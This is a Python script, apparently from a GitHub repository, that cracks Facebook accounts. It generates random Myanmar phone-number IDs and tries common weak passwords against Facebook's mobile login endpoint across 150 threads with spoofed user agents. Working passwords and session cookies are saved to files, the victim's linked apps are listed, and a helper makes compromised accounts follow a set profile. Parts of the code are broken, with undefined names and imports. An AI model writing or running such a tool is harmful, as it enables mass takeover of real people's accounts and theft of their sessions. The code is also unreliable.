#-------------------------------------------------------------
#Don't Forget To Follow My Github &
#Sent Star This Repositories .kmkllyy😁
#-------------------------------------------------------------
#10K-Gift-Test-Coding
#!/usr/bin/python3
#-*-coding:utf-8-*-
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#-----[Global Functions]-----#
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
#-----[Colours]-----#
RED = '\033[1;91m' #
WHITE = '\033[1;97m' #
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m' #
BLUE = '\033[1;34m' #
ORANGE = '\033[1;35m' #
P = '\x1b[1;97m' # 
M = '\x1b[1;91m' # 
H = '\x1b[1;92m' # 
K = '\x1b[1;92m' # 
B = '\x1b[1;94m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;96m' #
N = '\x1b[0m' #
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
mtd,cp_cpx,cokix=[],[],[]
ugen2=[]
ugen=[]
#-----[App Checker]-----#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s  [%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r  [😍] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r  [%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s  [%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s  [%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r  [🥵] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r  [%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
           
#-----[UserAgent]-----#
#Dalvik/2.1.0 (Linux; U; Android 13; SM-G780G Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/435.0.0.32.108;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/537314828;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBDV/SM-G780G;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2168};FB_FW/1;]    
for xd in range(10000):
    aa='Dalvik/2.1.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=' SM-G780G Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/'
    h=random.randrange(109,379)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(20,100)
    l='FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/537314828;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBDV/SM-G780G;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2168};FB_FW/1'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
         

   
#-----[Loop Menu]-----#  
loop = 0
oks = []
cps = []

#-----[Main-Menu]-----#
def mumit_menu():
    os.system('clear');print(logo)
    print('\033[1;92m  [1] MYANMAR RANDOM CRACK')
    print('\033[1;92m  [0] EXIT TOOL')
    linex()
    mumit=input(' \033[1;32m [?] SELECT MENU: ')
    if mumit in['1','01']:innocent()
    elif mumit in['0','00']:exit()
    else:exit()    
def innocent():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[0;15m  [√] UID CODE : 699/677/259/450/766/789/')
    linex()
    code = input('\033[0;15m  [?] CHOOSE : ')
    os.system('clear')
    print(logo)
    print('\033[0;15m  [√] EXAMPLE : 3000/5000/10000/30000/50000')
    linex()
    limit = int(input('\033[0;16m  [?] CHOOSE : '))
    linex()
    xd_cp=input(f'\033[0;15m  [?] You Want To Show Cp Account?[\033[1;32mY\033[1;34m/\033[1;31mN\033[1;32m]: ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
    else:cp_cpx.append('n')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=150) as ahare:
        clear()
        tl = str(len(user))
        print('\033[0;15m  [+] Choice Code: '+code)
        print('\033[0;15m  [+] Crack Process Has Started')
        print('\033[0;15m  [✈] Use Flight Mode For Speed Up')
        linex()
        for fuck in user:
            pwx = [code+fuck,fuck,code+fuck[:3],'myanmar','myanmar123','Myanmar123','Myanmar','kyawkyaw','aungaung','zawzaw','moemoe','linlin','minmin','chitchit']
            uid = '09'+code+fuck
            ahare.submit(mumitx,uid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /Free-OK.txt')
    print('Cp Ids Saved in /Free-CP.txt')
    linex()
    
def mumitx(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
    'method':'POST',
    'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
    'scheme':'https',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://m.facebook.com',
    'referer': 'https://m.facebook.com/',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'x-asbd-id': '198387',
    'x-fb-lsd': 'AVoPmsopEAk',
    'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"M"+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print('\r\r\033[1;32m[Free-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/Free-OK.txt', 'a').write( uid+' | '+ps+'\nCookie = '+coki+'\n\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"M"+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                if 'y' in cp_cpx: 
                 print('\r\r\x1b[38;5;14m[Free-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/Free-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mFree\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass 
        print(logo)
        print(" \033[1;35m[\033[1;32m1\033[1;35m] \033[1;32m𝐑𝐀𝐍𝐃𝐎𝐌 𝐔𝐈𝐃 𝐂𝐋𝐎𝐍𝐈𝐍𝐆")
        print(" \033[1;35m[\033[1;32m2\033[1;35m] \033[1;32m𝐓𝐀𝐋𝐊 𝐎𝐍 𝐅𝐀𝐂𝐄𝐁𝐁𝐎𝐊")
        print(" \033[1;35m[\033[1;32m3\033[1;35m] \033[1;32m𝐉𝐎𝐈𝐍 𝐎𝐔𝐑 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ??𝐑𝐎𝐔𝐏")
        print(" \033[1;35m[\033[1;32m0\033[1;35m] \033[1;31m𝐄𝐗𝐈𝐓")
        print("\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        Saba =input("\n\x1b[38;5;155m [➤] \033[1;32m𝐂𝐇𝐎𝐎𝐒𝐄 𝐀 𝐕𝐀𝐋𝐈𝐃 𝐎𝐏𝐓𝐈𝐎𝐍 : \033[1;32m")
        if Saba in ['1']:        	
            mahin()
        if Saba in ['2']:
        	os.system('xdg-open https://www.facebook.com/profile.php?id=naylin.facebook.2004')
        if Saba in ['3']:
            os.system('xdg-open https://www.facebook.com/')
        if Saba in [" 0", "00"]:
            exit()
        else:
            exit()      
#-----[Run Menu]-----#
mumit_menu()